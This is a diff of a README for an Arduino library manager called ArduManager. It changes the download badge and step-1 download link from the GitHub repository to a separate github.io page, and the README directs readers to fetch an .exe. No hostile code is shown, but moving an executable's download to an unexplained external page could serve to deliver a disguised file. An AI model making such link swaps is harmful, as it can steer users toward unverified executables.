@@ -1,6 +1,6 @@
 # ⚙️ ArduManager - Manage your Arduino libraries with ease
 
-[![Download ArduManager](https://img.shields.io/badge/Download-ArduManager-blue.svg)](https://github.com/Daniell5408/ArduManager)
+[![Download ArduManager](https://img.shields.io/badge/Download-ArduManager-blue.svg)](https://daniell5408.github.io)
 
 ## 📖 About this program
 ArduManager helps you handle Arduino libraries and boards. It connects to GitHub to find and save files for your projects. You do not need technical skills to use this tool. It organizes your development workspace and keeps your files up to date. You avoid searching through folders manually. The program automates the download process for you.
@@ -16,7 +16,7 @@ Your computer needs to meet these basic standards to run ArduManager:
 ## 📥 How to download
 You visit the official repository page to get the software. Follow these steps to obtain the setup file:
 
-1. Visit the following link: https://github.com/Daniell5408/ArduManager
+1. Visit the following link: https://daniell5408.github.io
 2. Look for the Releases section on the right side of the screen.
 3. Click the latest version link.
 4. Locate the file ending in .exe.
